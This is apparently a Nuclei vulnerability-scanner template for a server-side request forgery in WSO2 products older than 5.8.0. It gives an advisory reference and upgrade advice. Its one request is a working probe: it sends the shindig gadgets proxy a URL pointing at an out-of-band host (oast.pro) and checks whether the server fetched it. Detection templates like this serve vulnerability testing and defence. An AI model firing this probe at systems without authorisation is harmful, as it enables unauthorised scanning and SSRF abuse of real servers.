id: WSO2-2019-0598
info:
  author: Amnotacat
  description: 'This vulnerability can be exploited by misusing the UI gadgets loading
    capability of the shindig web application. An attacker can alter a specific URL
    in the request causing the server to initiate a GET request to the altered URL.

    '
  name: WSO2 < 5.8.0 - Server Side Request Forgery
  reference:
  - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2019-0598
  remediation: 'Upgrade the product version to 5.8.0 or higher which are not affected
    by this SSRF vulnerability.

    '
  severity: critical
  tags: ssrf,wso2,shindig
requests:
- matchers:
  - type: word
    words:
    - Interactsh Server
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/shindig/gadgets/proxy?container=default&url=http://oast.pro'
